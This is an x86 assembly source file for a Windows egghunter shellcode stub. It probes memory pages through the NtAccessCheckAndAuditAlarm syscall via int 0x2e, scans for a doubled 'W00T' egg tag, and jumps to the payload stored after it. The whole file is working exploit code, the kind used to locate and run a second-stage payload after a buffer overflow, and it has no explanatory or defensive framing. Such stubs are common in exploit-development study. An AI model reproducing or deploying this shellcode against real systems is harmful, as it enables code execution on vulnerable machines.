global _start
section .text
_start:
;Begin egghunter
inc_page:
	or dx, 0x0fff
inc_mem:
	inc edx
	push edx
	push 0x02  ;syscall for NtAccessCheckAndAuditAlarm. syscalls in windows take arguments in edx
	pop eax
	int 0x2e
	cmp al, 0x5
	pop edx
	jz inc_page

	mov eax, 0x57303054 ;egg W00T
	mov edi, edx
	scasd
	jne inc_mem
	scasd
	jne inc_mem

	jmp edi



